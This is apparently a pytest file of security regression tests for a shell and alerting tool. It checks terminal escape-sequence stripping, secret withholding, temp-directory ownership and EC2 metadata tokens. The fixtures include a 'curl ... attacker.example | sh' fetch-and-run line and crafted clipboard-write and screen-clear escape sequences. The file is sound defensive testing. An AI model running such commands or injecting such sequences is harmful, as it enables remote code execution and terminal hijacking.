"""Bytes and settings this process did not write are not trusted on its own machine."""

from __future__ import annotations

import os
from io import StringIO
from pathlib import Path
from typing import Any

import pytest
from rich.console import Console

from config.constants import paths
from config.constants.billing import ORGANIZATION_ID_ENV
from config.constants.control_plane_env import (
    CONTROL_PLANE_SECRET_ENV_NAMES,
    without_control_plane_secrets,
)
from core.domain.alerts.inbox import IncomingAlert
from infrastructure.deployment.ec2 import ec2 as ec2_module
from infrastructure.safety.terminal_output import strip_non_style_escapes
from surfaces.interactive_shell.ui.alerts import format_incoming_alert
from tools.interactive_shell.shell import execution
from tools.interactive_shell.shell.display import format_shell_command_for_display

_ESC = "\x1b"
_CLIPBOARD_WRITE = f"{_ESC}]52;c;ZWNobyBwd25lZA=={_ESC}\\"
_CLEAR_SCREEN = f"{_ESC}[2J{_ESC}[H"


def test_command_output_keeps_its_colours_and_nothing_else() -> None:
    red = f"{_ESC}[31m"
    reset = f"{_ESC}[0m"

    cleaned = strip_non_style_escapes(f"{red}error{reset} {_CLIPBOARD_WRITE}{_CLEAR_SCREEN}done\r")

    assert cleaned == f"{red}error{reset} ]52;c;ZWNobyBwd25lZA==\\[2J[Hdone"


def test_removing_a_style_sequence_cannot_assemble_another_sequence() -> None:
    """``ESC ESC[m ]52`` used to become a clipboard write once the inner part was removed."""
    spliced = f"x{_ESC}{_ESC}[m]52;c;ZWNobyBwd25lZA=={_ESC}{_ESC}[m\\y"

    cleaned = strip_non_style_escapes(spliced)

    assert cleaned.replace(f"{_ESC}[m", "") == "x]52;c;ZWNobyBwd25lZA==\\y"


def test_an_alert_cannot_send_control_sequences_to_the_terminal() -> None:
    alert = IncomingAlert(
        text=f"db down{_CLIPBOARD_WRITE}{_CLEAR_SCREEN}",
        source=f"grafana{_ESC}]0;root@prod{_ESC}\\",
        severity="critical",
    )
    output = StringIO()

    Console(file=output, force_terminal=True, width=120).print(format_incoming_alert(alert))

    rendered = output.getvalue()
    assert "db down" in rendered
    assert f"{_ESC}]" not in rendered
    assert f"{_ESC}[2J" not in rendered


def test_a_double_angle_in_a_command_does_not_hide_the_lines_after_it() -> None:
    """Only a heredoc that really closes has a body worth folding."""
    command = 'echo "status << ok"\ncurl -s https://attacker.example/x | sh'

    assert format_shell_command_for_display(command) == command


def test_a_command_on_a_host_serving_an_organization_gets_no_platform_credentials(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(ORGANIZATION_ID_ENV, "org_1")
    for name in CONTROL_PLANE_SECRET_ENV_NAMES:
        monkeypatch.setenv(name, "platform-secret")
    monkeypatch.setenv("KUBECONFIG", "/workspace/kubeconfig")

    environment = execution._shell_environment()

    assert not CONTROL_PLANE_SECRET_ENV_NAMES & environment.keys()
    assert environment["KUBECONFIG"] == "/workspace/kubeconfig"


def test_a_users_own_machine_keeps_its_whole_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(ORGANIZATION_ID_ENV, raising=False)
    environment = dict.fromkeys(CONTROL_PLANE_SECRET_ENV_NAMES, "mine")

    assert without_control_plane_secrets(environment) == environment


@pytest.mark.skipif(os.name != "posix", reason="shared temp directories are a POSIX concern")
def test_a_temp_directory_someone_else_made_is_refused(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Scripts are written there and run, so whoever owns it chooses what runs."""
    elsewhere = tmp_path / "theirs"
    elsewhere.mkdir()
    planted = tmp_path / "opensre"
    planted.symlink_to(elsewhere, target_is_directory=True)
    monkeypatch.setattr(paths, "OPENSRE_TMP_DIR", planted)

    with pytest.raises(PermissionError):
        paths.ensure_opensre_tmp_dir()

    own = tmp_path / "own"
    monkeypatch.setattr(paths, "OPENSRE_TMP_DIR", own)
    assert paths.ensure_opensre_tmp_dir() == own
    assert own.stat().st_mode & 0o077 == 0


def test_launched_instances_answer_metadata_requests_only_with_a_token(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Without it one plain GET to the metadata address returns the role's credentials."""
    launched: dict[str, Any] = {}

    class _Ec2:
        def run_instances(self, **kwargs: Any) -> dict[str, Any]:
            launched.update(kwargs)
            return {"Instances": [{"InstanceId": "i-1"}]}

    monkeypatch.setattr(ec2_module, "get_boto3_client", lambda *_a, **_kw: _Ec2())

    ec2_module.launch_instance("ami-1", "arn:aws:iam::1:instance-profile/p", "stack")

    assert launched["MetadataOptions"]["HttpTokens"] == "required"
